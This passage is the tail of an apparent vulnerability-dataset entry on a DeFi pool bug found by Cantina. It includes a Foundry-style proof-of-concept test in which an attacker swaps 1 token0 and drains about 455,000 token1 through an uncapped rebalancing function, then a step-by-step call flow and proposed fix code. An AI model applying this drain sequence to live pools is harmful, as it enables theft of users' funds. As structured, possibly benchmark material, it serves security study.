token1.mint(address(pool), 827430 * 1e6);\n    pool.updatePoolState();\n    \n    // Attacker sends 1 token0\n    token0.mint(attacker, 1e18);\n    vm.prank(attacker);\n    token0.approve(address(pool), 1e18);\n    \n    // Execute exploit\n    vm.prank(attacker);\n    uint256 amountOut = pool.swap(1e18, true, false);\n    \n    // Assertion: attacker received massive output from tiny input\n    assert(amountOut > 455000 * 1e6);  // ~455k token1\n    \n    // Pool state after:\n    // token0: 500k + 1 = 500,001\n    // token1: 827k - 455k = 372k\n    // Liquidity drained!\n}\n\n// The test shows:\n// Input: 1 token0\n// Output: 455,400 token1\n// Ratio: 455,400x\n// Expected ratio at oracle: ~1.6548x\n// Exploit magnitude: 275,000x overpayment"
      }
    ],
    "call_flow": [
      "1. Attacker calls PAMMPool.swap(1, token0→token1, false)",
      "2. Pool delegates to PricingEngine.exactIn",
      "3. Check quote-heavy: price*reserveX < reserveY? YES",
      "4. Call _exactInWithScore with amountIn=1",
      "5. Call _balancing to find equilibrium split",
      "6. balancingX ≈ 0.0001 << 1",
      "7. Check amountIn (1) > balancingX (0.0001)? YES",
      "8. Call _extend(reserveY, 0.9999, ...)",
      "9. _extend calls _backOutX to reconstruct base reserve",
      "10. Then calls _baseIn with reconstructed reserve",
      "11. _baseIn formula: c*Y*in / (c*X + in)",
      "12. With X underestimated and in small: output ≈ c*Y",
      "13. Returns 455,400 token1",
      "14. No maxInputAmount check to cap this",
      "15. PAMMPool transfers 455,400 to attacker",
      "16. Pool reserves severely depleted"
    ],
    "context_hint": "This is a missing bounds check vulnerability. The rebalancing mechanism is intended to help the pool recover from imbalance, but without output caps, it becomes a drain. The fix requires either capping _extend output or enforcing maxInputAmount checks.",
    "expert_notes": "Cantina found the issue through fuzzing and reproduced it with the real parameters. The core problem is that _extend has no safeguards and can output unlimited amounts. Combined with the quote-heavy path vulnerability, attackers can drain large portions of the pool. The fix requires: (1) capping rebalancing subsidy, or (2) enforcing per-token input limits.",
    "fix_description": "Cap the rebalancing subsidy so amountOut never exceeds the lesser of reserveOut and (amountIn * oraclePrice). Additionally, enforce setMaxInputAmount for both tokens to prevent single swaps from draining the scarce reserve.",
    "fix_code": "// FIX 1: Cap the extend output\nfunction _extend(\n    UD60x18 reserveY,\n    UD60x18 amountInRem,\n    UD60x18 balancingY,\n    UD60x18 balancingX,\n    UD60x18 c,\n    UD60x18 price  // ADDED: need price for fair-value cap\n) internal pure returns (UD60x18) {\n    // Reconstructs virtual base reserve\n    UD60x18 reserveX = _backOutX(\n        reserveY,\n        balancingX,\n        balancingY,\n        c\n    );\n    \n    // FIXED: Price against reconstructed reserve\n    UD60x18 output = _baseIn(reserveX, reserveY, amountInRem, c);\n    \n    // FIXED: Cap output to fair value (oracle price)\n    // Prevent over-subsidy\n    UD60x18 fairValue = amountInRem * price;\n    output = output > fairValue ? fairValue : output;\n    \n    // FIXED: Also cap to available reserves\n    output = output > reserveY ? reserveY : output;\n    \n    return output;\n}\n\n// FIX 2: Enforce input limits\nfunction exactIn(\n    UD60x18 amountIn,\n    bytes32 oracleId,\n    bool zeroForOne\n) external view returns (UD60x18) {\n    // FIXED: Check max input amount\n    uint256 maxInput = maxInputAmount[oracleId];\n    if (maxInput != 0 && amountIn > wrap(maxInput)) {\n        revert InputTooLarge();\n    }\n    \n    // Rest of calculation\n}\n\n// FIX 3: Proper pool initialization\nfunction createPool(...) public returns (PAMMPool pool) {\n    pool = ...\n    \n    // FIXED: Set conservative per-token limits\n    // Based on oracle and reserve size\n    uint256 maxToken0 = reserveToken0 / 100;  // Max 1% of reserves\n    uint256 maxToken1 = reserveToken1 / 100;\n    \n    pricingEngine.setMaxInputAmount(oracleId, maxToken0);\n}\n\n// With fixes:\n// - Attacker sends: 1 token0\n// - _extend output capped: min(455k, 1*1.65, 827k) = 1.65 token1\n// - Attacker receives: 1.65 token1 (fair price)\n// - Pool reserves protected\n// - No drain possible"
  }
]